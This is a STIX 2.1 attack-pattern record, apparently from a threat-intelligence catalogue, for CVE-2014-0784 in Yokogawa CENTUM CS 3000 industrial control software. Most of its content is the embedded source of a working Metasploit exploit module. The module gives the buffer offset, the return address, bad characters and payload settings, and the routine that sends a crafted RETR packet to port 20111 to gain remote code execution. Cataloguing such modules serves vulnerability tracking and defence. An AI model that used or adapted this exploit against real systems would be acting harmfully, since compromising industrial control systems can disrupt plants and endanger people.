{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--878513c9-9e90-4ca1-b2bc-306e97378995",
    "created": "2024-08-14T16:39:03.358973Z",
    "modified": "2024-08-14T16:39:03.358978Z",
    "name": "Yokogawa CENTUM CS 3000 BKBCopyD.exe Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability exists in the service BKBCopyD.exe when handling specially crafted packets. This module has been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/yokogawa_bkbcopyd_bof.rb",
            "external_id": "yokogawa_bkbcopyd_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/03/10/yokogawa-centum-cs3000-vulnerabilities"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0784"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yokogawa CENTUM CS 3000 BKBCopyD.exe Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability\n        exists in the service BKBCopyD.exe when handling specially crafted packets. This module has\n        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'juan vazquez',\n          'Redsadic <julian.vilas[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/03/10/yokogawa-centum-cs3000-vulnerabilities' ],\n          [ 'CVE', '2014-0784']\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 373, # 500 for the full RETR argument\n          'DisableNops'    => true,\n          'BadChars'       => \"\\x00\\x0d\\x0a\\xff\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\\xff\\xff\" # Stack adjustment # add esp, -3500 # double \\xff char to put it on memory\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Yokogawa CENTUM CS 3000 R3.08.50 / Windows XP SP3',\n            {\n              'Ret'    => 0x6404625d, # push esp # ret # libBKBUtil.dll]\n              'Offset' => 123\n            }\n          ],\n        ],\n      'DisclosureDate' => '2014-03-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(20111)\n      ])\n  end\n\n  def check\n    pkt = build_probe\n    res = send_pkt(pkt)\n    if valid_response?(res)\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    data = \"RETR \"\n    data << rand_text(target['Offset'])\n    data << [target.ret].pack(\"V\")\n    data << payload.encoded\n    data << \"\\n\"\n\n    print_status(\"Trying target #{target.name}, sending #{data.length} bytes...\")\n    connect\n    sock.put(data)\n    disconnect\n  end\n\n  def build_probe\n    \"#{rand_text_alpha(10)}\\n\"\n  end\n\n  def send_pkt(data)\n    connect\n    sock.put(data)\n    data = sock.get_once\n    disconnect\n\n    return data\n  end\n\n  def valid_response?(data)\n    return false unless !!data\n    return false unless data =~ /500  'yyparse error': command not understood/\n    return true\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-03-10",
    "x_mitre_platforms": [
        "win'"
    ]
}